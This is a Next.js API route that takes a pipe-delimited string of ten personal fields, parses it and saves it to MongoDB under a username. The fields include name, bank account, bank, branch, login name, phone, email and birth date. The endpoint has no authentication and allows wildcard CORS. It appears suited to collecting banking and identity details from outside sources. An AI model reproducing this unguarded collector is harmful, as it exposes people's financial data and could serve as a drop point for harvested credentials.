import clientPromise from "@/lib/mongodb";
import { NextRequest, NextResponse } from "next/server";

export async function POST(
  req: NextRequest,
  context: { params: Promise<{ username: string }> } // ✅ fix kiểu Promise
) {
  try {
    const { username } = await context.params; // ✅ phải await

    const { data } = await req.json();

    if (!username)
      return NextResponse.json({ error: "Missing username" }, { status: 400 });
    if (!data || typeof data !== "string")
      return NextResponse.json(
        { error: "Invalid data string" },
        { status: 400 }
      );

    // Tách chuỗi dữ liệu theo dấu "|"
    const parts = data.split("|");
    if (parts.length !== 10)
      return NextResponse.json(
        { error: "Data must have 10 fields" },
        { status: 400 }
      );

    // Tạo object record
    const record = {
      username,
      hoVaTen: parts[0].trim(),
      soTaiKhoan: parts[1].trim(),
      tenNganHang: parts[2].trim(),
      chiNhanh: parts[3].trim(),
      tenDangNhap: parts[4].trim(),
      nickname: parts[5].trim(),
      soPhien: parts[6].trim(),
      soDienThoai: parts[7].trim(),
      email: parts[8].trim(),
      ngaySinh: parts[9].trim(),
      rawData: data,
      createdAt: new Date(),
    };

    // Kết nối MongoDB
    const client = await clientPromise;
    const db = client.db("user_data");
    const collection = db.collection("records");

    await collection.insertOne(record);

    return NextResponse.json(
      { success: true, message: "Saved successfully" },
      { status: 201 }
    );
  } catch (error) {
    console.error("Save record error:", error);
    return NextResponse.json({ error: "Failed to save" }, { status: 500 });
  }
}

// CORS support (optional)
export async function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    },
  });
}
